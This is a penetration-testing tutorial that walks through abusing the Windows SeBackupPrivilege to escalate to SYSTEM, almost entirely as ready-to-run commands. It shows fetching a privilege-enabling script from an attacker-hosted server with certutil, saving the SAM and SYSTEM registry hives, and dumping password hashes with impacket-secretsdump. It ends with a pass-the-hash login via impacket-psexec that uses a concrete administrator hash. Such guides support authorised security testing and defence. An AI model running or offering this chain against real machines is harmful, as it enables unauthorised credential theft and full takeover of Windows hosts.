---
legal-banner: true
---

### **Introduction**

`SeBackupPrivilege` allows a user to back up files and directories.  
This privilege grants the ability to traverse any folder and list its contents, even if the user is not explicitly listed in the folder’s Access Control List (ACL).  

It is commonly assigned to service accounts for backup purposes, but during a penetration test it can be abused for privilege escalation.

### **Step 1: Check current user privileges**

1.  Check if the current user has `SeBackupPrivilege`:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/128.png)

    **Note:** If it is not enabled, proceed to Step 2.

### **Step 2: Enable SeBackupPrivilege (optional)**

1.  Download the **EnableAllTokenPrivs.ps1** script:  
    `wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`  

    ![](../../../img/Windows-Environment/129.png)

    **Note:** Host the script with Python:  
    `python -m http.server 80`
    
2.  Transfer the script to the target machine with `certutil`:  
    `certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1`  
    
    ![](../../../img/Windows-Environment/130.png)

3.  Import the script to enable the privilege:  
    `Import-Module .\EnableAllTokenPrivs.ps1`
    
4.  Verify that `SeBackupPrivilege` is now enabled:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/131.png)

### **Step 3: Exploit — backup SAM & SYSTEM**

1.  Save the registry hives:  
    ```
    reg save hklm\system system.hive
    reg save hklm\sam sam.hive
    ```
    
    ![](../../../img/Windows-Environment/132.png)
    
2.  Transfer `sam.hive` and `system.hive` to the attacker machine (e.g., via SMB), then extract credentials with **impacket-secretsdump**:  
    `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  
    
    ![](../../../img/Windows-Environment/133.png)
    
3.  Use the Administrator NTLM hash to perform a **Pass-the-Hash** attack and gain SYSTEM access:  
    `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a administrator@[IP-ADDRESS]`  
    
    ![](../../../img/Windows-Environment/134.png)
